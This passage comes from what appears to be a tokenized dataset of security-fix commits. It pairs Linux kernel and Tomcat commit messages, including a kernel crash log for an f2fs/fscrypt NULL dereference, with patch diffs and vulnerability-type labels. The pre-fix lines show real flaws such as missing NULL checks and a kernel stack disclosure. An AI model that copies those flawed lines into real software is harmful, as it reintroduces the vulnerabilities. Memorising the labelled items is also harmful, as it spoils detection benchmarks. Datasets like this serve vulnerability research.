"lookup_slow+0x35/0x50", "[", "846.431874]", "walk_component+0x1c6/0x470", "[", "846.431878]", "?", "memcg_kmem_charge_memcg+0x70/0x90", "[", "846.431880]", "?", "page_add_file_rmap+0x13/0x200", "[", "846.431882]", "path_lookupat+0x76/0x230", "[", "846.431884]", "?", "__alloc_pages_nodemask+0xfc/0x280", "[", "846.431886]", "filename_lookup+0xb8/0x1a0", "[", "846.431890]", "?", "_cond_resched+0x16/0x40", "[", "846.431891]", "?", "kmem_cache_alloc+0x160/0x1d0", "[", "846.431894]", "?", "path_listxattr+0x41/0xa0", "[", "846.431896]", "path_listxattr+0x41/0xa0", "[", "846.431898]", "do_syscall_64+0x55/0x100", "[", "846.431901]", "entry_SYSCALL_64_after_hwframe+0x44/0xa9", "[", "846.431902]", "RIP:", "0033:0x7f882de1c0d7", "[", "846.431903]", "Code:", "f0", "ff", "ff", "73", "01", "c3", "48", "8b", "0d", "be", "dd", "2b", "00", "f7", "d8", "64", "89", "01", "48", "83", "c8", "ff", "c3", "66", "2e", "0f", "1f", "84", "00", "00", "00", "00", "00", "66", "90", "b8", "c2", "00", "00", "00", "0f", "05", "<48>", "3d", "01", "f0", "ff", "ff", "73", "01", "c3", "48", "8b", "0d", "91", "dd", "2b", "00", "f7", "d8", "64", "89", "01", "48", "[", "846.431934]", "RSP:", "002b:00007ffe8e66c238", "EFLAGS:", "00000202", "ORIG_RAX:", "00000000000000c2", "[", "846.431936]", "RAX:", "ffffffffffffffda", "RBX:", "0000000000000000", "RCX:", "00007f882de1c0d7", "[", "846.431937]", "RDX:", "0000000000000071", "RSI:", "00007ffe8e66c280", "RDI:", "0000000001a880c0", "[", "846.431939]", "RBP:", "00007ffe8e66c300", "R08:", "0000000001a88010", "R09:", "0000000000000000", "[", "846.431940]", "R10:", "00000000000001ab", "R11:", "0000000000000202", "R12:", "0000000000400550", "[", "846.431941]", "R13:", "00007ffe8e66c400", "R14:", "0000000000000000", "R15:", "0000000000000000", "[", "846.431943]", "---[", "end", "trace", "abca54df39d14f5d", "]---", "[", "846.432033]", "F2FS-fs", "(loop0):", "access", "invalid", "blkaddr:1024", "[", "846.432051]", "WARNING:", "CPU:", "1", "PID:", "1249", "at", "fs/f2fs/checkpoint.c:154", "f2fs_is_valid_blkaddr+0x10f/0x160", "[", "846.432051]", "Modules", "linked", "in:", "snd_hda_codec_generic", "snd_hda_intel", "snd_hda_codec", "snd_hda_core", "snd_hwdep", "snd_pcm", "snd_timer", "snd", "input_leds", "joydev", "soundcore", "serio_raw", "i2c_piix4", "mac_hid", "ib_iser", "rdma_cm", "iw_cm", "ib_cm", "ib_core", "configfs", "iscsi_tcp", "libiscsi_tcp", "libiscsi", "scsi_transport_iscsi", "autofs4", "raid10", "raid456", "libcrc32c", "async_raid6_recov", "async_memcpy", "async_pq", "async_xor", "xor", "async_tx", "raid6_pq", "raid1", "raid0", "multipath", "linear", "qxl", "ttm", "crct10dif_pclmul", "crc32_pclmul", "drm_kms_helper", "ghash_clmulni_intel", "syscopyarea", "sysfillrect", "sysimgblt", "fb_sys_fops", "pcbc", "drm", "8139too", "aesni_intel", "8139cp", "floppy", "psmouse", "mii", "aes_x86_64", "crypto_simd", "pata_acpi", "cryptd", "glue_helper", "[", "846.432085]", "CPU:", "1", "PID:", "1249", "Comm:", "a.out", "Tainted:", "G", "W", "4.18.0-rc3+", "#1", "[", "846.432086]", "Hardware", "name:", "QEMU", "Standard", "PC", "(i440FX", "+", "PIIX,", "1996),", "BIOS", "Ubuntu-1.8.2-1ubuntu1", "04/01/2014", "[", "846.432089]", "RIP:", "0010:f2fs_is_valid_blkaddr+0x10f/0x160", "[", "846.432089]", "Code:", "00", "eb", "ed", "31", "c0", "83", "fa", "05", "75", "ae", "48", "83", "ec", "08", "48", "8b", "3f", "89", "f1", "48", "c7", "c2", "fc", "0b", "0f", "8b", "48", "c7", "c6", "8b", "d7", "09", "8b", "88", "44", "24", "07", "e8", "61", "8b", "ff", "ff", "<0f>", "0b", "0f", "b6", "44", "24", "07", "48", "83", "c4", "08", "eb", "81", "4c", "8b", "47", "10", "8b", "8f", "38", "04", "00", "[", "846.432120]", "RSP:", "0018:ffff961c414a7900", "EFLAGS:", "00010286", "[", "846.432122]", "RAX:", "0000000000000000", "RBX:", "0000000000000400", "RCX:", "0000000000000006", "[", "846.432123]", "RDX:", "0000000000000000", "RSI:", "0000000000000096", "RDI:", "ffff89dfffd165d0", "[", "846.432124]", "RBP:", "ffff89dff5492800", "R08:", "0000000000000001", "R09:", "000000000000029d", "[", "846.432125]", "R10:", "ffff961c414a7820", "R11:", "000000000000029d", "R12:", "0000000000000400", "[", "846.432126]", "R13:", "0000000000000000", "R14:", "ffff89dff4ff88d0", "R15:", "0000000000000000", "[", "846.432128]", "FS:", "00007f882e2fb700(0000)", "GS:ffff89dfffd00000(0000)", "knlGS:0000000000000000", "[", "846.432130]", "CS:", "0010", "DS:", "0000", "ES:", "0000", "CR0:", "0000000080050033", "[", "846.432131]", "CR2:", "0000000001a88008", "CR3:", "00000001eb572000", "CR4:", "00000000000006e0", "[", "846.432135]", "Call", "Trace:", "[", "846.432151]", "f2fs_wait_on_block_writeback+0x20/0x110", "[", "846.432158]", "f2fs_grab_read_bio+0xbc/0xe0", "[", "846.432161]", "f2fs_submit_page_read+0x21/0x280", "[", "846.432163]", "f2fs_get_read_data_page+0xb7/0x3c0", "[", "846.432165]", "f2fs_get_lock_data_page+0x29/0x1e0", "[", "846.432167]", "f2fs_get_new_data_page+0x148/0x550", "[", "846.432170]", "f2fs_add_regular_entry+0x1d2/0x550", "[", "846.432178]", "?", "__switch_to+0x12f/0x460", "[", "846.432181]", "f2fs_add_dentry+0x6a/0xd0", "[", "846.432184]", "f2fs_do_add_link+0xe9/0x140", "[", "846.432186]", "__recover_dot_dentries+0x260/0x280", "[", "846.432189]", "f2fs_lookup+0x343/0x390", "[", "846.432193]", "__lookup_slow+0x97/0x150", "[", "846.432195]", "lookup_slow+0x35/0x50", "[", "846.432208]", "walk_component+0x1c6/0x470", "[", "846.432212]", "?", "memcg_kmem_charge_memcg+0x70/0x90", "[", "846.432215]", "?", "page_add_file_rmap+0x13/0x200", "[", "846.432217]", "path_lookupat+0x76/0x230", "[", "846.432219]", "?", "__alloc_pages_nodemask+0xfc/0x280", "[", "846.432221]", "filename_lookup+0xb8/0x1a0", "[", "846.432224]", "?", "_cond_resched+0x16/0x40", "[", "846.432226]", "?", "kmem_cache_alloc+0x160/0x1d0", "[", "846.432228]", "?", "path_listxattr+0x41/0xa0", "[", "846.432230]", "path_listxattr+0x41/0xa0", "[", "846.432233]", "do_syscall_64+0x55/0x100", "[", "846.432235]", "entry_SYSCALL_64_after_hwframe+0x44/0xa9", "[", "846.432237]", "RIP:", "0033:0x7f882de1c0d7", "[", "846.432237]", "Code:", "f0", "ff", "ff", "73", "01", "c3", "48", "8b", "0d", "be", "dd", "2b", "00", "f7", "d8", "64", "89", "01", "48", "83", "c8", "ff", "c3", "66", "2e", "0f", "1f", "84", "00", "00", "00", "00", "00", "66", "90", "b8", "c2", "00", "00", "00", "0f", "05", "<48>", "3d", "01", "f0", "ff", "ff", "73", "01", "c3", "48", "8b", "0d", "91", "dd", "2b", "00", "f7", "d8", "64", "89", "01", "48", "[", "846.432269]", "RSP:", "002b:00007ffe8e66c238", "EFLAGS:", "00000202", "ORIG_RAX:", "00000000000000c2", "[", "846.432271]", "RAX:", "ffffffffffffffda", "RBX:", "0000000000000000", "RCX:", "00007f882de1c0d7", "[", "846.432272]", "RDX:", "0000000000000071", "RSI:", "00007ffe8e66c280", "RDI:", "0000000001a880c0", "[", "846.432273]", "RBP:", "00007ffe8e66c300", "R08:", "0000000001a88010", "R09:", "0000000000000000", "[", "846.432274]", "R10:", "00000000000001ab", "R11:", "0000000000000202", "R12:", "0000000000400550", "[", "846.432275]", "R13:", "00007ffe8e66c400", "R14:", "0000000000000000", "R15:", "0000000000000000", "[", "846.432277]", "---[", "end", "trace", "abca54df39d14f5e", "]---", "[", "846.432279]", "F2FS-fs", "(loop0):", "invalid", "blkaddr:", "1024,", "type:", "5,", "run", "fsck", "to", "fix.", "[", "846.432376]", "WARNING:", "CPU:", "1", "PID:", "1249", "at", "fs/f2fs/f2fs.h:2697", "f2fs_wait_on_block_writeback+0xb1/0x110", "[", "846.432376]", "Modules", "linked", "in:", "snd_hda_codec_generic", "snd_hda_intel", "snd_hda_codec", "snd_hda_core", "snd_hwdep", "snd_pcm", "snd_timer", "snd", "input_leds", "joydev", "soundcore", "serio_raw", "i2c_piix4", "mac_hid", "ib_iser", "rdma_cm", "iw_cm", "ib_cm", "ib_core", "configfs", "iscsi_tcp", "libiscsi_tcp", "libiscsi", "scsi_transport_iscsi", "autofs4", "raid10", "raid456", "libcrc32c", "async_raid6_recov", "async_memcpy", "async_pq", "async_xor", "xor", "async_tx", "raid6_pq", "raid1", "raid0", "multipath", "linear", "qxl", "ttm", "crct10dif_pclmul", "crc32_pclmul", "drm_kms_helper", "ghash_clmulni_intel", "syscopyarea", "sysfillrect", "sysimgblt", "fb_sys_fops", "pcbc", "drm", "8139too", "aesni_intel", "8139cp", "floppy", "psmouse", "mii", "aes_x86_64", "crypto_simd", "pata_acpi", "cryptd", "glue_helper", "[", "846.432410]", "CPU:", "1", "PID:", "1249", "Comm:", "a.out", "Tainted:", "G", "W", "4.18.0-rc3+", "#1", "[", "846.432411]", "Hardware", "name:", "QEMU", "Standard", "PC", "(i440FX", "+", "PIIX,", "1996),", "BIOS", "Ubuntu-1.8.2-1ubuntu1", "04/01/2014", "[", "846.432413]", "RIP:", "0010:f2fs_wait_on_block_writeback+0xb1/0x110", "[", "846.432414]", "Code:", "66", "90", "f0", "ff", "4b", "34", "74", "59", "5b", "5d", "c3", "48", "8b", "7d", "00", "41", "b8", "05", "00", "00", "00", "89", "d9", "48", "c7", "c2", "d8", "e8", "0e", "8b", "48", "c7", "c6", "1d", "b0", "0a", "8b", "e8", "df", "bc", "fd", "ff", "<0f>", "0b", "f0", "80", "4d", "48", "04", "e9", "67", "ff", "ff", "ff", "48", "8b", "03", "48", "c1", "e8", "37", "83", "e0", "07", "[", "846.432445]", "RSP:", "0018:ffff961c414a7910", "EFLAGS:", "00010286", "[", "846.432447]", "RAX:", "0000000000000000", "RBX:", "0000000000000400", "RCX:", "0000000000000006", "[", "846.432448]", "RDX:", "0000000000000000", "RSI:", "0000000000000092", "RDI:", "ffff89dfffd165d0", "[", "846.432449]", "RBP:", "ffff89dff5492800", "R08:", "0000000000000000", "R09:", "00000000000002d1", "[", "846.432450]", "R10:", "ffff961c414a7820", "R11:", "ffff89dfad50cf80", "R12:", "0000000000000400", "[", "846.432451]", "R13:", "0000000000000000", "R14:", "ffff89dff4ff88d0", "R15:", "0000000000000000", "[", "846.432453]", "FS:", "00007f882e2fb700(0000)", "GS:ffff89dfffd00000(0000)", "knlGS:0000000000000000", "[", "846.432454]", "CS:", "0010", "DS:", "0000", "ES:", "0000", "CR0:", "0000000080050033", "[", "846.432455]", "CR2:", "0000000001a88008", "CR3:", "00000001eb572000", "CR4:", "00000000000006e0", "[", "846.432459]", "Call", "Trace:", "[", "846.432463]", "f2fs_grab_read_bio+0xbc/0xe0", "[", "846.432464]", "f2fs_submit_page_read+0x21/0x280", "[", "846.432466]", "f2fs_get_read_data_page+0xb7/0x3c0", "[", "846.432468]", "f2fs_get_lock_data_page+0x29/0x1e0", "[", "846.432470]", "f2fs_get_new_data_page+0x148/0x550", "[", "846.432473]", "f2fs_add_regular_entry+0x1d2/0x550", "[", "846.432475]", "?", "__switch_to+0x12f/0x460", "[", "846.432477]", "f2fs_add_dentry+0x6a/0xd0", "[", "846.432480]", "f2fs_do_add_link+0xe9/0x140", "[", "846.432483]", "__recover_dot_dentries+0x260/0x280", "[", "846.432485]", "f2fs_lookup+0x343/0x390", "[", "846.432488]", "__lookup_slow+0x97/0x150", "[", "846.432490]", "lookup_slow+0x35/0x50", "[", "846.432505]", "walk_component+0x1c6/0x470", "[", "846.432509]", "?", "memcg_kmem_charge_memcg+0x70/0x90", "[", "846.432511]", "?", "page_add_file_rmap+0x13/0x200", "[", "846.432513]", "path_lookupat+0x76/0x230", "[", "846.432515]", "?", "__alloc_pages_nodemask+0xfc/0x280", "[", "846.432517]", "filename_lookup+0xb8/0x1a0", "[", "846.432520]", "?", "_cond_resched+0x16/0x40", "[", "846.432522]", "?", "kmem_cache_alloc+0x160/0x1d0", "[", "846.432525]", "?", "path_listxattr+0x41/0xa0", "[", "846.432526]", "path_listxattr+0x41/0xa0", "[", "846.432529]", "do_syscall_64+0x55/0x100", "[", "846.432531]", "entry_SYSCALL_64_after_hwframe+0x44/0xa9", "[", "846.432533]", "RIP:", "0033:0x7f882de1c0d7", "[", "846.432533]", "Code:", "f0", "ff", "ff", "73", "01", "c3", "48", "8b", "0d", "be", "dd", "2b", "00", "f7", "d8", "64", "89", "01", "48", "83", "c8", "ff", "c3", "66", "2e", "0f", "1f", "84", "00", "00", "00", "00", "00", "66", "90", "b8", "c2", "00", "00", "00", "0f", "05", "<48>", "3d", "01", "f0", "ff", "ff", "73", "01", "c3", "48", "8b", "0d", "91", "dd", "2b", "00", "f7", "d8", "64", "89", "01", "48", "[", "846.432565]", "RSP:", "002b:00007ffe8e66c238", "EFLAGS:", "00000202", "ORIG_RAX:", "00000000000000c2", "[", "846.432567]", "RAX:", "ffffffffffffffda", "RBX:", "0000000000000000", "RCX:", "00007f882de1c0d7", "[", "846.432568]", "RDX:", "0000000000000071", "RSI:", "00007ffe8e66c280", "RDI:", "0000000001a880c0", "[", "846.432569]", "RBP:", "00007ffe8e66c300", "R08:", "0000000001a88010", "R09:", "0000000000000000", "[", "846.432570]", "R10:", "00000000000001ab", "R11:", "0000000000000202", "R12:", "0000000000400550", "[", "846.432571]", "R13:", "00007ffe8e66c400", "R14:", "0000000000000000", "R15:", "0000000000000000", "[", "846.432573]", "---[", "end", "trace", "abca54df39d14f5f", "]---", "[", "846.434280]", "BUG:", "unable", "to", "handle", "kernel", "NULL", "pointer", "dereference", "at", "0000000000000008", "[", "846.434424]", "PGD", "80000001ebd3a067", "P4D", "80000001ebd3a067", "PUD", "1eb1ae067", "PMD", "0", "[", "846.434551]", "Oops:", "0000", "[#1]", "SMP", "PTI", "[", "846.434697]", "CPU:", "0", "PID:", "44", "Comm:", "kworker/u5:0", "Tainted:", "G", "W", "4.18.0-rc3+", "#1", "[", "846.434805]", "Hardware", "name:", "QEMU", "Standard", "PC", "(i440FX", "+", "PIIX,", "1996),", "BIOS", "Ubuntu-1.8.2-1ubuntu1", "04/01/2014", "[", "846.435000]", "Workqueue:", "fscrypt_read_queue", "decrypt_work", "[", "846.435174]", "RIP:", "0010:fscrypt_do_page_crypto+0x6e/0x2d0", "[", "846.435351]", "Code:", "00", "65", "48", "8b", "04", "25", "28", "00", "00", "00", "48", "89", "84", "24", "88", "00", "00", "00", "31", "c0", "e8", "43", "c2", "e0", "ff", "49", "8b", "86", "48", "02", "00", "00", "85", "ed", "c7", "44", "24", "70", "00", "00", "00", "00", "<48>", "8b", "58", "08", "0f", "84", "14", "02", "00", "00", "48", "8b", "78", "10", "48", "8b", "0c", "24", "48", "c7", "84", "24", "[", "846.435696]", "RSP:", "0018:ffff961c40f9bd60", "EFLAGS:", "00010206", "[", "846.435870]", "RAX:", "0000000000000000", "RBX:", "ffffc5f787719b80", "RCX:", "ffffc5f787719b80", "[", "846.436051]", "RDX:", "ffffffff8b9f4b88", "RSI:", "ffffffff8b0ae622", "RDI:", "ffff961c40f9bdb8", "[", "846.436261]", "RBP:", "0000000000001000", "R08:", "ffffc5f787719b80", "R09:", "0000000000001000", "[", "846.436433]", "R10:", "0000000000000018", "R11:", "fefefefefefefeff", "R12:", "ffffc5f787719b80", "[", "846.436562]", "R13:", "ffffc5f787719b80", "R14:", "ffff89dff4ff88d0", "R15:", "0ffff89dfaddee60", "[", "846.436658]", "FS:", "0000000000000000(0000)", "GS:ffff89dfffc00000(0000)", "knlGS:0000000000000000", "[", "846.436758]", "CS:", "0010", "DS:", "0000", "ES:", "0000", "CR0:", "0000000080050033", "[", "846.436898]", "CR2:", "0000000000000008", "CR3:", "00000001eddd0000", "CR4:", "00000000000006f0", "[", "846.437001]", "Call", "Trace:", "[", "846.437181]", "?", "check_preempt_wakeup+0xf2/0x230", "[", "846.437276]", "?", "check_preempt_curr+0x7c/0x90", "[", "846.437370]", "fscrypt_decrypt_page+0x48/0x4d", "[", "846.437466]", "__fscrypt_decrypt_bio+0x5b/0x90", "[", "846.437542]", "decrypt_work+0x12/0x20", "[", "846.437651]", "process_one_work+0x15e/0x3d0", "[", "846.437740]", "worker_thread+0x4c/0x440", "[", "846.437848]", "kthread+0xf8/0x130", "[", "846.437938]", "?", "rescuer_thread+0x350/0x350", "[", "846.438022]", "?", "kthread_associate_blkcg+0x90/0x90", "[", "846.438117]", "ret_from_fork+0x35/0x40", "[", "846.438201]", "Modules", "linked", "in:", "snd_hda_codec_generic", "snd_hda_intel", "snd_hda_codec", "snd_hda_core", "snd_hwdep", "snd_pcm", "snd_timer", "snd", "input_leds", "joydev", "soundcore", "serio_raw", "i2c_piix4", "mac_hid", "ib_iser", "rdma_cm", "iw_cm", "ib_cm", "ib_core", "configfs", "iscsi_tcp", "libiscsi_tcp", "libiscsi", "scsi_transport_iscsi", "autofs4", "raid10", "raid456", "libcrc32c", "async_raid6_recov", "async_memcpy", "async_pq", "async_xor", "xor", "async_tx", "raid6_pq", "raid1", "raid0", "multipath", "linear", "qxl", "ttm", "crct10dif_pclmul", "crc32_pclmul", "drm_kms_helper", "ghash_clmulni_intel", "syscopyarea", "sysfillrect", "sysimgblt", "fb_sys_fops", "pcbc", "drm", "8139too", "aesni_intel", "8139cp", "floppy", "psmouse", "mii", "aes_x86_64", "crypto_simd", "pata_acpi", "cryptd", "glue_helper", "[", "846.438653]", "CR2:", "0000000000000008", "[", "846.438713]", "---[", "end", "trace", "abca54df39d14f60", "]---", "[", "846.438796]", "RIP:", "0010:fscrypt_do_page_crypto+0x6e/0x2d0", "[", "846.438844]", "Code:", "00", "65", "48", "8b", "04", "25", "28", "00", "00", "00", "48", "89", "84", "24", "88", "00", "00", "00", "31", "c0", "e8", "43", "c2", "e0", "ff", "49", "8b", "86", "48", "02", "00", "00", "85", "ed", "c7", "44", "24", "70", "00", "00", "00", "00", "<48>", "8b", "58", "08", "0f", "84", "14", "02", "00", "00", "48", "8b", "78", "10", "48", "8b", "0c", "24", "48", "c7", "84", "24", "[", "846.439084]", "RSP:", "0018:ffff961c40f9bd60", "EFLAGS:", "00010206", "[", "846.439176]", "RAX:", "0000000000000000", "RBX:", "ffffc5f787719b80", "RCX:", "ffffc5f787719b80", "[", "846.440927]", "RDX:", "ffffffff8b9f4b88", "RSI:", "ffffffff8b0ae622", "RDI:", "ffff961c40f9bdb8", "[", "846.442083]", "RBP:", "0000000000001000", "R08:", "ffffc5f787719b80", "R09:", "0000000000001000", "[", "846.443284]", "R10:", "0000000000000018", "R11:", "fefefefefefefeff", "R12:", "ffffc5f787719b80", "[", "846.444448]", "R13:", "ffffc5f787719b80", "R14:", "ffff89dff4ff88d0", "R15:", "0ffff89dfaddee60", "[", "846.445558]", "FS:", "0000000000000000(0000)", "GS:ffff89dfffc00000(0000)", "knlGS:0000000000000000", "[", "846.446687]", "CS:", "0010", "DS:", "0000", "ES:", "0000", "CR0:", "0000000080050033", "[", "846.447796]", "CR2:", "0000000000000008", "CR3:", "00000001eddd0000", "CR4:", "00000000000006f0", "-", "Location", "https://elixir.bootlin.com/linux/v4.18-rc4/source/fs/crypto/crypto.c#L149", "struct", "crypto_skcipher", "*tfm", "=", "ci->ci_ctfm;", "Here", "ci", "can", "be", "NULL", "Note", "that", "this", "issue", "maybe", "require", "CONFIG_F2FS_FS_ENCRYPTION=y", "to", "reproduce.", "Reported-by", "Wen", "Xu", "<wen.xu@gatech.edu>", "Signed-off-by:", "Chao", "Yu", "<yuchao0@huawei.com>", "Signed-off-by:", "Jaegeuk", "Kim", "<jaegeuk@kernel.org>"], "code_tokens": ["@", "@", "-", "546", ",", "6", "+", "546", ",", "9", "@", "@", "static", "struct", "bio", "*", "f2fs_grab_read_bio", "(", "struct", "inode", "*", "inode", ",", "block_t", "blkaddr", ",", "struct", "bio_post_read_ctx", "*", "ctx", ";", "unsigned", "int", "post_read_steps", "=", "0", ";", "if", "(", "!", "f2fs_is_valid_blkaddr", "(", "sbi", ",", "blkaddr", ",", "DATA_GENERIC", ")", ")", "return", "ERR_PTR", "(", "-", "EFAULT", ")", ";", "bio", "=", "f2fs_bio_alloc", "(", "sbi", ",", "min_t", "(", "int", ",", "nr_pages", ",", "BIO_MAX_PAGES", ")", ",", "false", ")", ";", "if", "(", "!", "bio", ")", "return", "ERR_PTR", "(", "-", "ENOMEM", ")", ";", "@", "@", "-", "68", ",", "14", "+", "68", ",", "16", "@", "@", "static", "void", "__get_inode_rdev", "(", "struct", "inode", "*", "inode", ",", "struct", "f2fs_inode", "*", "ri", ")", "}", "}", "static", "bool", "__written_first_block", "(", "struct", "f2fs_sb_info", "*", "sbi", ",", "static", "int", "__written_first_block", "(", "struct", "f2fs_sb_info", "*", "sbi", ",", "struct", "f2fs_inode", "*", "ri", ")", "{", "block_t", "addr", "=", "le32_to_cpu", "(", "ri", "-", ">", "i_addr", "[", "offset_in_addr", "(", "ri", ")", "])", ";", "if", "(", "is_valid_data_blkaddr", "(", "sbi", ",", "addr", ")", ")", "return", "true", ";", "return", "false", ";", "if", "(", "!", "__is_valid_data_blkaddr", "(", "addr", ")", ")", "return", "1", ";", "if", "(", "!", "f2fs_is_valid_blkaddr", "(", "sbi", ",", "addr", ",", "DATA_GENERIC", ")", ")", "return", "-", "EFAULT", ";", "return", "0", ";", "}", "static", "void", "__set_inode_rdev", "(", "struct", "inode", "*", "inode", ",", "struct", "f2fs_inode", "*", "ri", ")", "@", "@", "-", "295", ",", "6", "+", "297", ",", "7", "@", "@", "static", "int", "do_read_inode", "(", "struct", "inode", "*", "inode", ")", "struct", "page", "*", "node_page", ";", "struct", "f2fs_inode", "*", "ri", ";", "projid_t", "i_projid", ";", "int", "err", ";", "/", "*", "Check", "if", "ino", "is", "within", "scope", "*", "/", "if", "(", "f2fs_check_nid_range", "(", "sbi", ",", "inode", "-", ">", "i_ino", ")", ")", "@", "@", "-", "368", ",", "7", "+", "371", ",", "12", "@", "@", "static", "int", "do_read_inode", "(", "struct", "inode", "*", "inode", ")", "/", "*", "get", "rdev", "by", "using", "inline_info", "*", "/", "__get_inode_rdev", "(", "inode", ",", "ri", ")", ";", "if", "(", "__written_first_block", "(", "sbi", ",", "ri", ")", ")", "err", "=", "__written_first_block", "(", "sbi", ",", "ri", ")", ";", "if", "(", "err", "<", "0", ")", "{", "f2fs_put_page", "(", "node_page", ",", "1", ")", ";", "return", "err", ";", "}", "if", "(", "!", "err", ")", "set_inode_flag", "(", "inode", ",", "FI_FIRST_BLOCK_WRITTEN", ")", ";", "if", "(", "!", "f2fs_need_inode_block_update", "(", "sbi", ",", "inode", "-", ">", "i_ino", ")", ")"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["netrom:", "Fix", "nr_getname()", "leak", "nr_getname()", "can", "leak", "kernel", "memory", "to", "user.", "Signed-off-by:", "Eric", "Dumazet", "<eric.dumazet@gmail.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "847", ",", "6", "+", "847", ",", "7", "@", "@", "static", "int", "nr_getname", "(", "struct", "socket", "*", "sock", ",", "struct", "sockaddr", "*", "uaddr", ",", "sax", "-", ">", "fsa_ax25", ".", "sax25_family", "=", "AF_NETROM", ";", "sax", "-", ">", "fsa_ax25", ".", "sax25_ndigis", "=", "1", ";", "sax", "-", ">", "fsa_ax25", ".", "sax25_call", "=", "nr", "-", ">", "user_addr", ";", "memset", "(", "sax", "-", ">", "fsa_digipeater", ",", "0", ",", "sizeof", "(", "sax", "-", ">", "fsa_digipeater", ")", ");", "sax", "-", ">", "fsa_digipeater", "[", "0", "]", "=", "nr", "-", ">", "dest_addr", ";", "*", "uaddr_len", "=", "sizeof", "(", "struct", "full_sockaddr_ax25", ")", ";", "}", "else", "{"], "docstring_tokens": ["8-bytes", "kernel", "stack", "disclosure"]}
{"contents": ["media:", "imon:", "Fix", "null-ptr-deref", "in", "imon_probe", "It", "seems", "that", "the", "return", "value", "of", "usb_ifnum_to_if()", "can", "be", "NULL", "and", "needs", "to", "be", "checked.", "Signed-off-by:", "Arvind", "Yadav", "<arvind.yadav.cs@gmail.com>", "Tested-by:", "Andrey", "Konovalov", "<andreyknvl@google.com>", "Signed-off-by:", "Sean", "Young", "<sean@mess.org>", "Signed-off-by:", "Mauro", "Carvalho", "Chehab", "<mchehab@osg.samsung.com>"], "code_tokens": ["@", "@", "-", "2515", ",", "6", "+", "2515", ",", "11", "@", "@", "static", "int", "imon_probe", "(", "struct", "usb_interface", "*", "interface", ",", "mutex_lock", "(", "&", "driver_lock", ")", ";", "first_if", "=", "usb_ifnum_to_if", "(", "usbdev", ",", "0", ")", ";", "if", "(", "!", "first_if", ")", "{", "ret", "=", "-", "ENODEV", ";", "goto", "fail", ";", "}", "first_if_ctx", "=", "usb_get_intfdata", "(", "first_if", ")", ";", "if", "(", "ifnum", "=", "=", "0", ")", "{"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["security:", "avoid", "calling", "a", "NULL", "function", "pointer", "in", "drivers/video/tvaudio.c", "NULL", "function", "pointers", "are", "very", "bad", "security", "wise.", "This", "one", "got", "caught", "by", "kerneloops.org", "quite", "a", "few", "times,", "so", "it's", "happening", "in", "the", "field....", "Fix", "is", "simple,", "check", "the", "function", "pointer", "for", "NULL,", "like", "6", "other", "places", "in", "the", "same", "function", "are", "already", "doing.", "Signed-off-by:", "Arjan", "van", "de", "Ven", "<arjan@linux.intel.com>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["@", "@", "-", "1792", ",", "7", "+", "1792", ",", "7", "@", "@", "static", "int", "chip_command", "(", "struct", "i2c_client", "*", "client", ",", "break", ";", "case", "VIDIOC_S_FREQUENCY", ":", "chip", "-", ">", "mode", "=", "0", ";", "/", "*", "automatic", "*", "/", "if", "(", "desc", "-", ">", "checkmode", ")", "{", "if", "(", "desc", "-", ">", "checkmode", "&", "&", "desc", "-", ">", "setmode", ")", "{", "desc", "-", ">", "setmode", "(", "chip", ",", "V4L2_TUNER_MODE_MONO", ")", ";", "if", "(", "chip", "-", ">", "prevmode", "!", "=", "V4L2_TUNER_MODE_MONO", ")", "chip", "-", ">", "prevmode", "=", "-", "1", ";", "/", "*", "reset", "previous", "mode", "*", "/"], "docstring_tokens": ["null-pointer", "dereference"]}
{"contents": ["Better", "adherence", "to", "RFC2616", "for", "content-length", "headers", "This", "is", "the", "fix", "for", ".", "git-svn-id:", "https://svn.apache.org/repos/asf/tomcat/trunk@1521829", "13f79535-47bb-0310-9956-ffa450edef68"], "code_tokens": ["@", "@", "-", "29", ",", "6", "+", "29", ",", "7", "@", "@", "import", "java", ".", "util", ".", "concurrent", ".", "atomic", ".", "AtomicBoolean", ";", "import", "javax", ".", "servlet", ".", "RequestDispatcher", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletResponse", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpUpgradeHandler", ";", "import", "org", ".", "apache", ".", "coyote", ".", "AbstractProcessor", ";", "@", "@", "-", "1110", ",", "6", "+", "1111", ",", "7", "@", "@", "protected", "void", "prepareRequest", "(", ")", "{", "/", "/", "Set", "this", "every", "time", "in", "case", "limit", "has", "been", "changed", "via", "JMX", "headers", ".", "setLimit", "(", "endpoint", ".", "getMaxHeaderCount", "(", "))", ";", "boolean", "contentLengthSet", "=", "false", ";", "int", "hCount", "=", "requestHeaderMessage", ".", "getInt", "(", ");", "for", "(", "int", "i", "=", "0", ";", "i", "<", "hCount", ";", "i", "+", "+)", "{", "String", "hName", "=", "null", ";", "@", "@", "-", "1144", ",", "9", "+", "1146", ",", "15", "@", "@", "protected", "void", "prepareRequest", "(", ")", "{", "if", "(", "hId", "=", "=", "Constants", ".", "SC_REQ_CONTENT_LENGTH", "|", "|", "(", "hId", "=", "=", "-", "1", "&", "&", "tmpMB", ".", "equalsIgnoreCase", "(", "\"", "Content", "-", "Length", "\"", "))", ")", "{", "/", "/", "just", "read", "the", "content", "-", "length", "header", ",", "so", "set", "it", "long", "cl", "=", "vMB", ".", "getLong", "(", ");", "request", ".", "setContentLength", "(", "cl", ")", ";", "if", "(", "contentLengthSet", ")", "{", "response", ".", "setStatus", "(", "HttpServletResponse", ".", "SC_BAD_REQUEST", ")", ";", "error", "=", "true", ";", "}", "else", "{", "contentLengthSet", "=", "true", ";", "/", "/", "Set", "the", "content", "-", "length", "header", "for", "the", "request", "request", ".", "setContentLength", "(", "cl", ")", ";", "}", "if", "(", "cl", "!", "=", "0", ")", "{", "bodyPresent", "=", "true", ";", "}", "@", "@", "-", "1263", ",", "10", "+", "1263", ",", "20", "@", "@", "protected", "void", "prepareRequest", "(", ")", "{", "/", "/", "Parse", "content", "-", "length", "header", "long", "contentLength", "=", "request", ".", "getContentLengthLong", "(", ");", "if", "(", "contentLength", ">", "=", "0", "&", "&", "!", "contentDelimitation", ")", "{", "getInputBuffer", "(", ").", "addActiveFilter", "(", "inputFilters", "[", "Constants", ".", "IDENTITY_FILTER", "]", ");", "contentDelimitation", "=", "true", ";", "if", "(", "contentLength", ">", "=", "0", ")", "{", "if", "(", "contentDelimitation", ")", "{", "/", "/", "contentDelimitation", "being", "true", "at", 